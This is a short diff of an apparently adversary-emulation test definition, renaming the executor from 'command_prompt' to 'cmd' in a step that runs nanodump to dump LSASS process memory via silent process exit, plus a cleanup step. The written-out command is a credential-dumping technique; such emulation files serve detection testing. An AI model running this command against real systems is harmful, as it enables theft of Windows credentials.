@@ -29,8 +29,8 @@ steps:
     - name: dump-lsass.exe-memory-through-silent-process-exit
       inline: |
         PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe --silent-process-exit "{{.Args.output_folder}}"
-      executor: command_prompt
+      executor: cmd
       cleanup:
         inline: |
             rmdir "{{.Args.output_folder}}" /s /q >nul 2> nul
-        executor: command_prompt
+        executor: cmd
